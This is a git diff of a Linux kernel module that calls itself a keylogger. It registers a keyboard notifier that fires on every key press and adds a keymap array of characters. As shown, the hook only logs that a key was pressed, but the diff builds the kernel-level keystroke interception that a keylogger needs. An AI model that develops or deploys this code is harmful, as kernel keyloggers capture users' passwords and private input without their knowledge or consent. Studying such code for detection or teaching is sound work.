@@ -1,5 +1,7 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
+#include <linux/notifier.h>
+#include <linux/keyboard.h>
 
 
 static const char* keymap[] = {
@@ -10,13 +12,31 @@ static const char* keymap[] = {
 	"x", "c", "v", "b", "n", "m", ",", "."
 };
 
+int notify_keypress(struct notifier_block *nb, unsigned long code, void *_param) {
+	struct keyboard_notifier_param *param;
+	param = _param;
+	if (code == KBD_KEYCODE && param->down) {
+		printk(KERN_NOTICE "A key was pressed...\n");
+	}
+	return NOTIFY_OK;
+}
+
+static struct notifier_block nb = {
+	.notifier_call = notify_keypress
+};
+
 static int __init startup(void) {
-	register_keylogger(&nb);
+	register_keyboard_notifier(&nb);
 	printk(KERN_INFO "Loaded keylogger!\n");
 	return 0;
 }
 
 static void __exit shutdown(void) {
-	unregister_keylogger(&nb);
-	print(KERN_INFO "Keylogger unloaded!\n");
+	unregister_keyboard_notifier(&nb);
+	printk(KERN_INFO "Keylogger unloaded!\n");
 }
+
+module_init(startup);
+module_exit(shutdown);
+MODULE_LICENSE("GPL");
+
